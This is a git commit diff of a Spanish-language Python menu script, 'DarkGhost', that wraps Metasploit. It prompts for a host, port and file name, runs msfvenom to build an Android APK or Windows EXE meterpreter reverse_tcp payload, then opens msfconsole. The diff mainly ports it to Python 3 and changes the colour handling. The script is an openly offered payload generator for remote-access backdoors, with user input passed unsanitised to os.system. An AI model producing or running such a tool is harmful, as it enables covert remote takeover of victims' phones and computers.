ceb750f46777464d89033feaae842375921ef97f
DarkSite <gonzaloroque21@gmail.com>
2020-05-24 07:20:52 -0500

    master

--- metasploit.py
+++ metasploit.py
@@ -2,41 +2,53 @@
 #-*- coding:utf8-*-
 
 import os,sys,time
-from colorama import init,Fore
+
 import socket
 
-init()
+blanco = '\u001b[30m'
+rojo = '\u001b[31m'
+verde = '\u001b[32m'
+amarillo = '\u001b[33m'
+azul = '\u001b[34m'
+magenta = '\u001b[35m'
+cyan = '\u001b[36m'
+blanco = '\u001b[37m'
+
+
+
+
+
 
 def entrada1():
 	os.system("clear")
-	print (Fore.YELLOW+"Tu direccion ip es: ")
+	print (rojo+"Tu direccion ip es: ")
 	direccion()
-	host = raw_input("Direccion IP/host: ")
-	port = raw_input("Puerto alojado(8080): ")
-	nombre = raw_input("Nombre del archivo: ")
+	host = input(blanco+"Direccion IP/host: ")
+	port = input("Puerto alojado(8080): ")
+	nombre = input("Nombre del archivo: ")
 
-	print (Fore.YELLOW+"Usaremos los siguientes párametros [msfvenom -p android/meterpreter/reverse_tcp LHOST=%s LPORT=%s R > %s.apk] ")%(host,port,nombre)
-	os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST=%s LPORT=%s R > %s.apk"%(host,port,nombre))
+	print (rojo+"Usaremos los siguientes párametros [msfvenom -p android/meterpreter/reverse_tcp LHOST="+ str(host) +" LPORT="+ str(port) +" R > "+ str(nombre) +".apk] ")
+	os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST="+ str(host) +" LPORT="+ str(port) +" R > "+ str(nombre) +".apk")
 
 	os.system("msfconsole")
 
 def direccion():
 	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 	s.connect(("8.8.8.8", 80))
-	print(s.getsockname()[0])
+	print(cyan+s.getsockname()[0])
 
 
 
 def entrada2():
 	os.system("clear")
-	print (Fore.YELLOW+"Tu direccion ip es: ")
+	print (verde+"Tu direccion ip es: ")
 	direccion()
-	host = raw_input("Direccion IP/host: ")
-	port = raw_input("Puerto alojado(8080): ")
-	nombre = raw_input("Nombre del archivo: ")
+	host = input(blanco+"Direccion IP/host: ")
+	port = input("Puerto alojado(8080): ")
+	nombre = input("Nombre del archivo: ")
 
-	print (Fore.YELLOW+"Usaremos los siguientes párametros [msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s R > %s.exe] ")%(host,port,nombre)
-	os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s R > %s.exe"%(host,port,nombre))
+	print (amarillo +"Usaremos los siguientes párametros [msfvenom -p windows/meterpreter/reverse_tcp LHOST="+ host +" LPORT="+ port +" R > "+ nombre +".exe] ")
+	os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST="+ host +" LPORT="+ port +" R > "+ nombre +".exe")
 
 	os.system("msfconsole")	
 
@@ -44,29 +56,42 @@ def entrada2():
 
 time.sleep(1.2)
 os.system("clear")
-print(Fore.RED+"                _                  _       _ _   ")
-print("               | |                | |     (_) |  ")
-print(" _ __ ___   ___| |_ __ _ ___ _ __ | | ___  _| |_ ")
-print("| '_ ` _ \ / _ \ __/ _` / __| '_ \| |/ _ \| | __|")
-print("| | | | | |  __/ || (_| \__ \ |_) | | (_) | | |_ ")
-print("|_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__|")
-print("                            | |                  ")
-print("                            |_|                  "+Fore.WHITE)
+print(rojo+str("                _                  _       _ _   "))
+print(str(rojo+"               | |                | |     (_) |  "))
+print(str(verde+" _ __ ___   ___| |_ __ _ ___ _ __ | | ___  _| |_ "))
+print(str(amarillo+"| '_ ` _ \ / _ \ __/ _` / __| '_ \| |/ _ \| | __|"))
+print(str(azul+"| | | | | |  __/ || (_| \__ \ |_) | | (_) | | |_ "))
+print(str(cyan+"|_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__|"))
+print(str(magenta+"                            | |                  "))
+print(str(blanco+"                            |_|                  "+blanco))
 time.sleep(0.2)
 
-print ("1- Android")
-print ("2- Pc "+Fore.GREEN)
+print ("[1]- Android")
+print ("[2]- Pc ")
+print ("[3]- Salir"+verde)
 
-ent = raw_input("DarkGhost-$ ")
 
-if ent == "1":
+inp = input("DarkGhost-$ "+blanco)
 
-	
+if inp == "1":
 	entrada1()
 
-if ent == "2":
+elif inp == "2":
 	
-	entada2()
+	entrada2()
 
-if ent == "3":
-	os.system("new_bash")
+elif inp == "3":
+	print ("[!]Saliendo")
+	time.sleep(0.5)
+	exit()
+
+else:
+	os.system("clear")
+	time.sleep(0.2)
+	print (rojo+"[!] Ingresaste un dato incorrecto")
+	time.sleep(2)
+	os.system("clear")
+	print ("[!]Saliendo")
+	time.sleep(2)
+	exit()
+		
